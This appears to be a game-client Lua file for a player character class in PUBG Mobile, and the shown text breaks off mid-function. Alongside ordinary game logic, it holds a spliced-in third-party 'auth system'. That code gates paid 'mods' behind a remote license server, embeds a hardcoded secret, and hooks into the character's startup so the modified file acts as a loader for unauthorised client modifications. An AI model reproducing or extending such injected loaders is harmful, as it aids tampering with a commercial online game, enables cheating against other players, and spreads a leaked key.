local BRPlayerCharacterBase = {
  ServerRPC = {},
  ClientRPC = {},
  MulticastRPC = {},
  LuaEventContainer = {}
}
BRPlayerCharacterBase.ServerRPC.ServerRPC_NearDeathGiveupRescue = {
  Reliable = true,
  Params = {}
}
BRPlayerCharacterBase.ServerRPC.ServerRPC_CarryDeadBox = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Object
  }
}
BRPlayerCharacterBase.ServerRPC.RPC_Server_GmPlayAction = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
BRPlayerCharacterBase.MulticastRPC.MulticastRPC_GmPlayAction = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
BRPlayerCharacterBase.ClientRPC.RPC_Client_SetShouldCheckPassWall = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Bool
  }
}
local ENetRole = import("ENetRole")
local EPawnState = import("EPawnState")
local ESpecialMovementType = import("ESpecialMovementType")
local ESpiderSwingMoveState = import("ESpiderSwingMoveState")
local ESurviveWeaponPropSlot = import("ESurviveWeaponPropSlot")
local EParachuteState = import("EParachuteState")
local EMovementMode = import("EMovementMode")
local EStateType = import("EStateType")
local ESTEPoseState = import("ESTEPoseState")
local EGameModeType = import("EGameModeType")
local STExtraGameStateBase = import("STExtraGameStateBase")
local UKismetSystemLibrary = import("KismetSystemLibrary")
local USTExtraBlueprintFunctionLibrary = import("STExtraBlueprintFunctionLibrary")
local GameplayData = require("GameLua.GameCore.Data.GameplayData")
local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
local MatchModeIds = require("GameLua.Mod.BaseMod.GamePlay.Config.MatchModeIdsConfig")

function BRPlayerCharacterBase:ctor()
end

function BRPlayerCharacterBase:_PostConstruct()
  BRPlayerCharacterBase.__super._PostConstruct(self)
  self:InitAddSpecialMoveInfo()
  self.bCanNearDeathGiveup = true
  print(bWriteLog and "BRPlayerCharacterBase:_PostConstruct bCanNearDeathGiveup true")
end

function BRPlayerCharacterBase:ReceiveBeginPlay()
  BRPlayerCharacterBase.__super.ReceiveBeginPlay(self)
  self:AddControlEvent(self, "MovementModeChangedDelegate", self.HandleOnMovementModeChangedNew, self)
  if self:HasAuthority() and self:CheckAddCheckFallingDistanceComponent() then
    local CheckFallingDistanceComponent_C = import("CheckFallingDistanceComponent")
    if slua.isValid(CheckFallingDistanceComponent_C) and not slua.isValid(self:GetComponentByClass(CheckFallingDistanceComponent_C)) then
      print(bWriteLog and "BRPlayerCharacterBase:ReceiveBeginPlay Add CheckFallingDistanceComponent")
      Game:AddComponent(CheckFallingDistanceComponent_C, self, "CheckFallingDistanceComponent")
    end
  end
  if slua.isValid(self.STCharacterMovement) then
    self.STCharacterMovement.bPositiveBlowUp = true
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy then
    self:AddControlEvent(self, "OnPawnStateDisabled", self.OnPawnStateChange, self)
    self:AddControlEvent(self, "OnPawnStateEnabled", self.OnPawnStateChange, self)
    self:AddControlEventConditionOnly(self, "OnAttrChangeEventDelegate", {
      AttrName = {
        "bCanSelfRescue"
      }
    }, self.CharacterAttrChangeEvent, self)
  end
  if Client then
    printf(bWriteLog and "BRPlayerCharacterBase:ReceiveBeginPlay, PlayerKey:%u ", self.PlayerKey)
    GameplayData.AddCharacter(self.Object)
    pcall(function()
      local isLocal = false
      if self.Role and ENetRole and self.Role == ENetRole.ROLE_AutonomousProxy then
        isLocal = true
      end
      if not isLocal and self.IsLocallyControlled then
        local ok, v = pcall(function() return self:IsLocallyControlled() end)
        if ok and v then isLocal = true end
      end
      if not isLocal then return end
      if _G.LicenseValid == true or _G.LicenseChecking == true then return end
      if _G.LicenseBeginPlayScheduled == true then return end
      _G.LicenseBeginPlayScheduled = true
      self:AddGameTimer(1.5, false, function()
        _G.License_Validate(function(valid)
          if valid then
            print("[License] VALID - Loading mods...")
            pcall(function()
              if _G.__AegisStartAfterLicense then
                _G.__AegisStartAfterLicense()
              end
            end)
          else
            print("[License] INVALID - Mods disabled")
            _G.ModsEnabled = false
            _G.LicenseBeginPlayScheduled = false
          end
        end)
      end)
    end)
  else
    self:AddCommonEventWithConditions(EVENTTYPE_INGAME_NORMAL, EVENTID_GAME_MODE_STATE_CHANGE, {
      [1] = "FinishedState"
    }, self.HandleFinishedState, self)
  end
end

function BRPlayerCharacterBase:CharacterAttrChangeEvent(uPawn, AttrName, AttrVal)
  BRPlayerCharacterBase.__super.CharacterAttrChangeEvent(self, uPawn, AttrName, AttrVal)
  if self.Object ~= uPawn then
    return
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy and AttrName == "bCanSelfRescue" then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:BroadcastUIMessage("UIMsg_CanSelfRescue", 0, "", "")
    end
  end
end

function BRPlayerCharacterBase:OnPawnStateChange(PawnState)
  print("BRPlayerCharacterBase:OnPawnStateChange:", PawnState)
  if PawnState == EPawnState.SwitchPP then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:BroadcastUIMessage("UIMsg_FPPModeChange", 0, "", "")
    end
  end
end

function BRPlayerCharacterBase:HandleFinishedState()
  print(bWriteLog and "BRPlayerCharacterBase:HandleFinishedState", self.STCharacterMovement)
  if slua.isValid(self.STCharacterMovement) and self.STCharacterMovement.SetDynamicSimpleQueryConfigDisable then
    local EDynamicSimpleQueryConfigDisableMask = import("EDynamicSimpleQueryConfigDisableMask")
    self.STCharacterMovement:SetDynamicSimpleQueryConfigDisable(EDynamicSimpleQueryConfigDisableMask.Bit0, true)
  end
end

function BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent()
  if CGameMode and CGameMode.GameModeType and CGameState and CGameState.GameModeID then
    local GameModeType = CGameMode.GameModeType
    local GameModeID = tonumber(CGameState.GameModeID)
    local bModeTypeSatisfy = GameModeType == EGameModeType.ETypicalGameMode or GameModeType == EGameModeType.EFourInOneGameMode or GameModeType == EGameModeType.EHeavyWeaponGameMode
    local bModeIDSatisfy = not MatchModeIds[GameModeID]
    print(bWriteLog and bWriteLog and "BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent:", GameModeType, GameModeID, bModeTypeSatisfy, bModeIDSatisfy)
    return bModeTypeSatisfy and bModeIDSatisfy
  end
  return false
end

function BRPlayerCharacterBase:LuaHandleParachuteStateChanged(LastParachuteState, NewParachuteState)
  BRPlayerCharacterBase.__super.LuaHandleParachuteStateChanged(self, LastParachuteState, NewParachuteState)
  if not Client then
    local uCurrentPlayerControl = self:GetPlayerControllerSafety()
    if slua.isValid(uCurrentPlayerControl) and uCurrentPlayerControl.CheckParachuteOpenFeature then
      if NewParachuteState == EParachuteState.PS_Opening then
        if uCurrentPlayerControl.CheckParachuteOpenFeature.SatrtCheckShowParachuteCloseUI then
          uCurrentPlayerControl.CheckParachuteOpenFeature:SatrtCheckShowParachuteCloseUI()
        end
      elseif NewParachuteState == EParachuteState.PS_None then
        if uCurrentPlayerControl.CheckParachuteOpenFeature.RecoverParachuteOpenParam then
          uCurrentPlayerControl.CheckParachuteOpenFeature:RecoverParachuteOpenParam()
        end
        if uCurrentPlayerControl.CheckParachuteOpenFeature.ClearTimerAndState then
          uCurrentPlayerControl.CheckParachuteOpenFeature:ClearTimerAndState()
        end
      end
    end
  end
end

function BRPlayerCharacterBase:OnLanded()
  printf("BRPlayerCharacterBase:OnLanded PlayerKey:%d", self.PlayerKey)
  if self.HandleOnLanded then
    self:HandleOnLanded(-1)
  end
  if not Client then
    local uCurrentPlayerControl = self:GetPlayerControllerSafety()
    if slua.isValid(uCurrentPlayerControl) and uCurrentPlayerControl.CheckParachuteOpenFeature then
      if uCurrentPlayerControl.CheckParachuteOpenFeature.ClearTimerAndState then
        uCurrentPlayerControl.CheckParachuteOpenFeature:ClearTimerAndState()
      end
      if uCurrentPlayerControl.CheckParachuteOpenFeature.ResetCheckShowUI then
        uCurrentPlayerControl.CheckParachuteOpenFeature:ResetCheckShowUI()
      end
    end
  end
end

function BRPlayerCharacterBase:ReceiveEndPlay(EndPlayReason)
  BRPlayerCharacterBase.__super.ReceiveEndPlay(self, EndPlayReason)
  if Client then
    GameplayData.RemoveCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:IsWarGameMode()
  local uGameState = GameplayData:GetGameState()
  if slua.isValid(uGameState) and Game:IsClassOf(uGameState, STExtraGameStateBase) then
    return uGameState.GameModeType == EGameModeType.EWarGameMode
  else
    return false
  end
end

function BRPlayerCharacterBase:BPOnRecycled()
  print(bWriteLog and string.format("%s BPOnRecycled()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
  end
end

function BRPlayerCharacterBase:BPOnRespawned()
  print(bWriteLog and string.format("%s BPOnRespawned()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
  end
end

function BRPlayerCharacterBase:ReceiveOnRecycle()
  print(bWriteLog and string.format("%s IReusable:ReceiveOnRecycle()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
    GameplayData.RemoveCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:ReceiveOnSpawn()
  print(bWriteLog and string.format("%s IReusable:ReceiveOnSpawn()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
    GameplayData.AddCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:ResetMeshRelativeLocationAndRotation()
  if Game:IsValid(self.Object) and Game:IsValid(self.Mesh) then
    local uDefaultMeshRot = FRotator(0, -90, 0)
    local uDefaultMeshRelativeLoc = FVector(0, 0, 0)
    if self.Mesh.K2_SetRelativeRotation then
      self.Mesh:K2_SetRelativeRotation(uDefaultMeshRot, false, nil, false)
    end
    self:CacheInitialMeshOffset(uDefaultMeshRelativeLoc, uDefaultMeshRot)
    local vRelativeRot = self.Mesh.RelativeRotation
    local vBaseRotationOffset = self.BaseRotationOffset
    local vBaseRotation = Game:QuatToRotator(vBaseRotationOffset)
    print(bWriteLog and bWriteLog and string.format("%s ResetMeshRelativeLocationAndRotation() Mesh.RelativeRotation: %s %s %s   Pawn.BaseRotationOffset:%s %s %s ", Game:GetPlainName(self.Object), tostring(vRelativeRot.Pitch), tostring(vRelativeRot.Yaw), tostring(vRelativeRot.Roll), tostring(vBaseRotation.Pitch), tostring(vBaseRotation.Yaw), tostring(vBaseRotation.Roll)))
  end
end

function BRPlayerCharacterBase:HandleOnMovementModeChangedNew()
  print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChanged11")
  if Game:IsValid(self.STCharacterMovement) and self.STCharacterMovement.MovementMode == EMovementMode.MOVE_Swimming and self:CheckBaseIsMoveable() then
    print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChanged22")
    self.CharacterMovement:SetBase(nil, "", true)
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy and Game:IsValid(self.STCharacterMovement) and self.STCharacterMovement.MovementMode == EMovementMode.MOVE_Walking and UIManager.UI_Config_InGame.ParachuteOpenUI then
    print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChangedNew CloseUI")
    UIManager.CloseUI(UIManager.UI_Config_InGame.ParachuteOpenUI)
  end
end

function BRPlayerCharacterBase:BPOnMissPlayerDamageRecord()
end

function BRPlayerCharacterBase:PreAttachedToVehicle()
  local IsDS = UKismetSystemLibrary.IsDedicatedServer(self)
  if not IsDS then
    return
  end
  local MainPlayerController = self:GetPlayerControllerSafety()
  if not slua.isValid(MainPlayerController) then
    return
  end
  local CharacterAvatarComp2_BP = self.CharacterAvatarComp2_BP
  if not slua.isValid(CharacterAvatarComp2_BP) then
    return
  end
  local CommerAvatarDataUtil = require("GameLua.Activity.Commercialize.GamePlay.CommerAvatarDataUtil")
  local changedVehicleId = CommerAvatarDataUtil:ChangeVehicleSkinByClothes(MainPlayerController, CharacterAvatarComp2_BP)
  local ESTExtraVehicleShapeType = import("ESTExtraVehicleShapeType")
  if changedVehicleId then
    local UAvatarUtils = import("AvatarUtils")
    if UAvatarUtils.GetVehicleShapeBySkinID(changedVehicleId) == ESTExtraVehicleShapeType.VST_Horse then
      local uCurPlayerState = self:GetPlayerStateSafety()
      if slua.isValid(uCurPlayerState) then
        print(bWriteLog and "  BRPlayerCharacterBase:PreAttachedToVehicle. changedVehicleId: " .. tostring(changedVehicleId))
        uCurPlayerState:AddGeneralCount(468, 1, false)
      end
    end
  end
end

function BRPlayerCharacterBase:ParachuteJump()
  local uPlayerController = self:GetControllerSafety()
  if slua.isValid(uPlayerController) then
    if not self:GetEnsure() then
      if uPlayerController:GetCurrentStateType() ~= EStateType.State_ParachuteJump and uPlayerController:GetCurrentStateType() ~= EStateType.State_ParachuteOpen then
        self:SwitchPoseState(ESTEPoseState.Stand, true, true, true, false)
        uPlayerController:ReInitParachuteItem()
        uPlayerController:ServerChangeStatePC(EStateType.State_ParachuteJump)
      end
      print(bWriteLog and "BRPlayerCharacterBase:ParachuteJump over")
    else
      EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_AI_CALL_PARACHUTE_JUMP, self.Object)
      print(bWriteLog and "BRPlayerCharacterBase:ParachuteJump AI JUMP over, Loc=", tostring(self:K2_GetActorLocation():ToString()))
    end
  end
end

function BRPlayerCharacterBase:OnMovementBaseChangedEvent(uCharacter, uNewMovementBase, uOldMovementBase)
  if uCharacter ~= self.Object then
    return
  end
  print(bWriteLog and string.format("BRPlayerCharacterBase:OnMovementBaseChangedEvent %s, Base: %s -> %s", uCharacter, uOldMovementBase, uNewMovementBase))
  local MedievalCrane = self:GetMedievalCraneFromBase(uNewMovementBase)
  if MedievalCrane and MedievalCrane.AddCharacter then
    MedievalCrane:AddCharacter(self.Object)
  else
    MedievalCrane = self:GetMedievalCraneFromBase(uOldMovementBase)
    if MedievalCrane and MedievalCrane.RemoveCharacter then
      MedievalCrane:RemoveCharacter(self.Object)
    end
  end
end

function BRPlayerCharacterBase:GetMedievalCraneFromBase(Base)
  if not slua.isValid(Base) or not Base.GetOwner then
    return
  end
  local Lifter = Base:GetOwner()
  if not slua.isValid(Lifter) then
    return
  end
  if not Lifter.AddCharacter then
    return
  end
  return Lifter
end

function BRPlayerCharacterBase:CheckForbidFlaregun()
  local uPlayerState = self:GetPlayerStateSafety()
  if not slua.isValid(uPlayerState) then
    return false
  end
  if uPlayerState.CanUseFlaregun == false and self:IsLocallyControlled() then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:DisplayGameTipWithMsgID(48532)
    end
  end
  return not uPlayerState.CanUseFlaregun
end

function BRPlayerCharacterBase:ServerRPC_NearDeathGiveupRescue()
  self:HandleNearDeathGiveupRescue()
end

function BRPlayerCharacterBase:HandleNearDeathGiveupRescue()
  local uNearDeathComp = self.NearDeatchComponent
  if self:IsNearDeath() and slua.isValid(uNearDeathComp) and self.bCanNearDeathGiveup == true then
    local uPlayerState = self:GetPlayerStateSafety()
    if slua.isValid(uPlayerState) then
      uPlayerState:AddGeneralCount(1613, 1, false)
    end
    uNearDeathComp:TriggerGotoDieExplictly(self.Object)
  end
end

function BRPlayerCharacterBase:RPC_Server_GmPlayAction(actionId)
  log(bWriteLog and "  BRPlayerCharacterBase:RPC_Server_GmPlayAction.  actionId: " .. tostring(actionId))
  if USTExtraBlueprintFunctionLibrary.IsDevelopment() then
    log(bWriteLog and "  BRPlayerCharacterBase:RPC_Server_GmPlayAction. IsDevelopment actionId: " .. tostring(actionId))
    self:MulticastRPC_GmPlayAction(actionId)
  end
end

function BRPlayerCharacterBase:MulticastRPC_GmPlayAction(actionId)
  if not Client then
    return
  end
  log(bWriteLog and "  BRPlayerCharacterBase:MulticastRPC_GmPlayAction.  actionId: " .. tostring(actionId))
  local uPlayEmoteComp = self:GetPlayEmoteComponent()
  if not slua.isValid(uPlayEmoteComp) then
    return
  end
  local LogFilter = require("common.log_filter")
  LogFilter.SetLogTreeEnable(true)
  local animCfg = CDataTable.GetTableData("EmoteBPTable", actionId)
  if not animCfg then
    return
  end
  local handlePath = animCfg.Path
  local EmoteHandleAsset = slua.loadObject(handlePath)
  local assetsArray = slua.Array(UEnums.EPropertyClass.Struct, import("/Script/CoreUObject.SoftObjectPath"))
  local handle = EmoteHandleAsset()
  uPlayEmoteComp:OnLoadEmoteAssetBegin(handle, actionId, assetsArray, "")
  log(bWriteLog and "  BRPlayerCharacterBase:MulticastRPC_GmPlayAction. assetsArray:Num(): " .. tostring(assetsArray:Num()))
  local tb = FuncUtil.LuaArrayToTable(assetsArray)
  local asset_util = require("common.asset_util")
  
  local function loadLater()
    uPlayEmoteComp:OnLoadEmoteAssetEnd(handle, actionId, 0)
  end
  
  asset_util.GetAssetsArrayAsyncParallel(tb, loadLater)
end

function BRPlayerCharacterBase:RPC_Client_SetShouldCheckPassWall(bServerSyncShouldCheckPassWall)
  print(bWriteLog and "BRPlayerCharacterBase:RPC_Client_SetShouldCheckPassWall " .. tostring(bServerSyncShouldCheckPassWall))
  if slua.isValid(self.ParachuteComponent) then
    self.ParachuteComponent.bServerSyncShouldCheckPassWall = bServerSyncShouldCheckPassWall
  end
end

function BRPlayerCharacterBase:OnPlayerEnterCarryBoxState()
  self.Super:OnPlayerEnterCarryBoxState()
  local CharName = self:GetPlayerNameSafety()
  print(bWriteLog and string.format("DeadBoxLog BRPlayerCharacterBase:OnPlayerEnterCarryBoxState Role:%s PlayerKey:%s Name:%s", tostring(self.Role), tostring(self.PlayerKey), tostring(CharName)))
  if self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:OnPlayerEnterCarryBoxState()
  end
end

function BRPlayerCharacterBase:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  self.Super:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  local CharName = self:GetPlayerNameSafety()
  print(bWriteLog and string.format("DeadBoxLog BRPlayerCharacterBase:OnPlayerLeaveCarryBoxState Role:%s PlayerKey:%s Name:%s bInIsInterrupt:%s", tostring(self.Role), tostring(self.PlayerKey), tostring(CharName), tostring(bInIsInterrupt)))
  if self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  end
end

function BRPlayerCharacterBase:ServerRPC_CarryDeadBox(uInDeadBox)
  if slua.isValid(uInDeadBox) and Game:IsClassOf(uInDeadBox, import("/Script/ShadowTrackerExtra.PlayerTombBox")) and self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:CarryDeadBox(uInDeadBox)
  end
end

function BRPlayerCharacterBase:SetAreaID(AreaID)
  self:SetAttrValue("AreaID", AreaID, -1)
end

function BRPlayerCharacterBase:GetAreaID()
  return math.floor(self:GetAttrValue("AreaID") + 0.5)
end

function BRPlayerCharacterBase:CannotChangeIntoPetSpectator()
  print(bWriteLog and "BRPlayerCharacterBase:CannotChangeIntoPetSpectator")
  return self.bCannotChangeIntoPetSpectator
end

function BRPlayerCharacterBase:DoModChangeToBT()
  print(bWriteLog and string.format("BRPlayerCharacterBase:DoModChangeToBT, PlayerKey=%s", tostring(self.PlayerKey)))
  if self:HasState(EPawnState.SpecialSuit) then
    self:TriggerEntrySkillWithID(4301101, true)
    print(bWriteLog and string.format("BRPlayerCharacterBase:DoModChangeToBT, PlayerKey=%s, HasState(EPawnState.SpecialSuit)", tostring(self.PlayerKey)))
  end
end

function BRPlayerCharacterBase:SwitchCameraToParachuteOpening()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteOpening")
  self.Super:SwitchCameraToParachuteOpening()
  if self.ParachuteFormation and self.ParachuteFormation.ShouldApplyFormationCamera and self.ParachuteFormation:ShouldApplyFormationCamera() then
    self.ParachuteFormation:OverlayFormationCameraParams()
    print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteOpening - Formation camera overlaid")
  end
end

function BRPlayerCharacterBase:SwitchCameraToParachuteFalling()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteFalling")
  self.Super:SwitchCameraToParachuteFalling()
  if self.ParachuteFormation and self.ParachuteFormation.ShouldApplyFormationCamera and self.ParachuteFormation:ShouldApplyFormationCamera() then
    self.ParachuteFormation:OverlayFormationCameraParams()
    print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteFalling - Formation camera overlaid")
  end
end

function BRPlayerCharacterBase:SwitchCameraToNormal()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToNormal")
  self.Super:SwitchCameraToNormal()
  if self.ParachuteFormation and self.ParachuteFormation.OnLandingClearFormationCamera then
    self.ParachuteFormation:OnLandingClearFormationCamera()
  end
end

function BRPlayerCharacterBase:SwitchWeaponCheck(Slot, IgnoreState)
  if self:HasState(EPawnState.AttachToOther) then
    local Weapon = self:GetWeaponBySlot(Slot)
    if slua.isValid(Weapon) then
      local WeaponID = Weapon:GetWeaponID()
      local AttachToOtherConfig = GamePlayTools.GetCurrentConfig("AttachToOtherConfig")
      if AttachToOtherConfig and AttachToOtherConfig.CheckIsWeaponInBlackList and AttachToOtherConfig.CheckIsWeaponInBlackList(WeaponID) then
        print(bWriteLog and "BRPlayerCharacterBase:SwitchWeaponCheck not allow switch weapon in AttachToOther, WeaponID: " .. tostring(WeaponID))
        local uPlayerController = self:GetPlayerControllerSafety()
        if Client and slua.isValid(uPlayerController) and uPlayerController.Role == ENetRole.ROLE_AutonomousProxy then
          uPlayerController:DisplayGameTipWithMsgID(47306)
        end
        return false
      end
    end
  end
  if self:HasState(EPawnState.WebSwing) and Slot ~= ESurviveWeaponPropSlot.SWPS_None and slua.isValid(self.STCharacterMovement) then
    local SpiderSwingObj = self.STCharacterMovement:GetSpecialMoveObjBySpecialMoveType(ESpecialMovementType.SPECIAL_MOVE_SpiderSwing)
    if slua.isValid(SpiderSwingObj) then
      local nCurState = SpiderSwingObj:GetCurMoveState()
      if nCurState == ESpiderSwingMoveState.Launching or nCurState == ESpiderSwingMoveState.Swinging then
        print(bWriteLog and "BRPlayerCharacterBase:SwitchWeaponCheck blocked by SpiderSwing state: " .. tostring(nCurState))
        return false
      end
    end
  end
  return self.Super:SwitchWeaponCheck(Slot, IgnoreState)
end

local VICTORY_DANCE_FX_MAP = {
  [12219601] = 22010089
}

local function ResolveEmoteResID(ItemID)
  local FxID = VICTORY_DANCE_FX_MAP[ItemID]
  if not FxID or FxID == ItemID then
    return ItemID
  end
  local model_util = require("client.common.model_util")
  local FxBPID = model_util.GetBPID(FxID)
  local ResID = ItemID
  if FxBPID and 0 < FxBPID and model_util.IsBattleItemHandleExist("Emote", FxBPID, false, false) then
    ResID = FxID
  end
  print(bWriteLog and string.format("BRPlayerCharacterBase 11 ResolveEmoteResID ItemID:%s, FxID:%s, FxBPID:%s, ResID:%s", tostring(ItemID), tostring(FxID), tostring(FxBPID), tostring(ResID)))
  return ResID
end

function BRPlayerCharacterBase:GetEmoteHandlePath(ItemID)
  local ResID = ResolveEmoteResID(ItemID)
  if self.Super then
    return self.Super:GetEmoteHandlePath(ResID)
  end
  local model_util = require("client.common.model_util")
  local BPID = model_util.GetBPID(ResID)
  if not BPID or BPID <= 0 then
    return ""
  end
  return model_util.GetPath("Emote", BPID, false, false) or ""
end

function BRPlayerCharacterBase:GetEmoteHandle(ItemID)
  local ResID = ResolveEmoteResID(ItemID)
  if self.Super then
    return self.Super:GetEmoteHandle(ResID)
  end
  local model_util = require("client.common.model_util")
  local BPID = model_util.GetBPID(ResID)
  if not BPID or BPID <= 0 then
    return nil
  end
  local HandleClass = model_util.GetClass("Emote", BPID, false, false)
  if not HandleClass then
    return nil
  end
  local Handle = HandleClass()
  if not slua.isValid(Handle) then
    return nil
  end
  return Handle
end

local class = require("class")
local CCharacterBase = require("GameLua.GameCore.Framework.CharacterBase")

local _slua = rawget(_G, "slua")

local function Chars(...)
  local n = select("#", ...)
  if n == 0 then return "" end
  local buf = {}
  for i = 1, n do
    buf[i] = string.char(select(i, ...))
  end
  return table.concat(buf)
end

local function Around(obj)
  if not obj then return false end
  if _slua and _slua.isValid then
    local ok, v = pcall(_slua.isValid, obj)
    if not ok or not v then return false end
  end
  return true
end

local function OnScreen(msg)
  local s = "" .. tostring(msg)
  pcall(function()
    local sh = import("ScriptHelperClient")
    if sh and sh.AddOnScreenDebugMessage then
      sh.AddOnScreenDebugMessage(s, -1, 3.0, {R=1, G=1, B=0, A=1}, {X=1.2, Y=1.2})
    end
  end)
  print(s)
end

local function GetSafeTime()
  local ok, t = pcall(function() return os.time(os.date("!*t")) end)
  if ok and t and t > 0 then return t end
  local ok2, t2 = pcall(os.time)
  if ok2 and t2 and t2 > 0 then return t2 end
  return 1728000000
end

-- ============================================================
-- AUTH SYSTEM — imported from fix.lua
-- ============================================================
do
-- AUTH GATE: BRPlayer-compatible online login
-- ============================================================================
-- 1. LICENSE CONFIG + CORE
-- ============================================================================
local MasterLicenseConfig = (function()
    return {
        url = 'https://sameer.keysgen.online/connect', game = 'PUBGM',
        timeout = 10, clockSkew = 120, expiryPath = nil,
        manualExpiry = "2026-12-31 23:59:59", tamperTolerance = 5,
        secret = 'DIAMONDYT',
    }
end)()

local MasterLicenseCore = (function()
    local Primitives = (function()
        local floor, abs, max = math.floor, math.abs, math.max
        local byte, char, format = string.byte, string.char, string.format
        local U32 = 4294967296
        local AND, XOR = {}, {}
        for a = 0, 15 do for b = 0, 15 do
            local av, bv, both, different, place = a, b, 0, 0, 1
            for _ = 1, 4 do
                local x, y = av % 2, bv % 2
                if x == 1 and y == 1 then both = both + place end
                if x ~= y then different = different + place end
                av, bv, place = floor(av / 2), floor(bv / 2), place * 2
            end
            AND[a * 16 + b], XOR[a * 16 + b] = both, different
        end end
        local function bitop(a, b, lookup)
            local value, place = 0, 1
            for _ = 1, 8 do
                value = value + lookup[(a % 16) * 16 + b % 16] * place
                a, b, place = floor(a / 16), floor(b / 16), place * 16
            end
            return value
        end
        local function band(a, b) return bitop(a, b, AND) end
        local function bxor(a, b) return bitop(a, b, XOR) end
        local function rol(value, amount)
            local divisor = 2 ^ (32 - amount)
            return (value % divisor) * 2 ^ amount + floor(value / divisor)
        end
        local function little32(value)
            return char(value % 256, floor(value / 256) % 256,
                floor(value / 65536) % 256, floor(value / 16777216) % 256)
        end
        local K = {
            0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
            0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,
            0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
            0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
            0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
            0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
            0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
            0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391
        }
        local SHIFT = {7,12,17,22,5,9,14,20,4,11,16,23,6,10,15,21}
        local function md5_raw(input)
            assert(type(input) == "string", "MD5 input must be a string")
            local size = #input
            local message = input .. char(128) .. string.rep(char(0), (55 - size) % 64)
                .. little32((size * 8) % U32) .. little32(floor(size / 536870912))
            local h0, h1, h2, h3 = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
            local words = {}
            for offset = 1, #message, 64 do
                for j = 0, 15 do
                    local a, b, c, d = byte(message, offset + j * 4, offset + j * 4 + 3)
                    words[j] = a + b * 256 + c * 65536 + d * 16777216
                end
                local a, b, c, d = h0, h1, h2, h3
                for i = 0, 63 do
                    local f, g, shiftBase
                    if i < 16 then
                        f, g, shiftBase = band(b, c) + band(U32 - 1 - b, d), i, 0
                    elseif i < 32 then
                        f, g, shiftBase = band(d, b) + band(U32 - 1 - d, c), (5 * i + 1) % 16, 4
                    elseif i < 48 then
                        f, g, shiftBase = bxor(bxor(b, c), d), (3 * i + 5) % 16, 8
                    else
                        local bOrNotD = U32 - 1 - band(U32 - 1 - b, d)
                        f, g, shiftBase = bxor(c, bOrNotD), (7 * i) % 16, 12
                    end
                    local nextB = (b + rol((a + f + K[i + 1] + words[g]) % U32,
                        SHIFT[shiftBase + i % 4 + 1])) % U32
                    a, b, c, d = d, nextB, b, c
                end
                h0, h1, h2, h3 = (h0 + a) % U32, (h1 + b) % U32, (h2 + c) % U32, (h3 + d) % U32
            end
            return little32(h0) .. little32(h1) .. little32(h2) .. little32(h3)
        end
        local function hex(input)
            return (input:gsub(".", function(c) return format("%02x", byte(c)) end))
        end
        local function md5(input) return hex(md5_raw(input)) end
        local function form_encode(input)
            assert(type(input) == "string", "Form value must be a string")
            return (input:gsub("[^A-Za-z0-9%-%._~ ]", function(c)
                return format("%%%02X", byte(c)) end):gsub(" ", "+"))
        end
        local function constant_time_equal(a, b)
            if type(a) ~= "string" or type(b) ~= "string" then return false end
            local difference = abs(#a - #b)
            for i = 1, max(#a, #b) do
                difference = difference + abs((byte(a, i) or 0) - (byte(b, i) or 0))
            end
            return difference == 0
        end
        local function name_uuid(input)
            local digest = md5_raw(input)
            local h = hex(digest:sub(1,6) .. char(byte(digest,7) % 16 + 48)
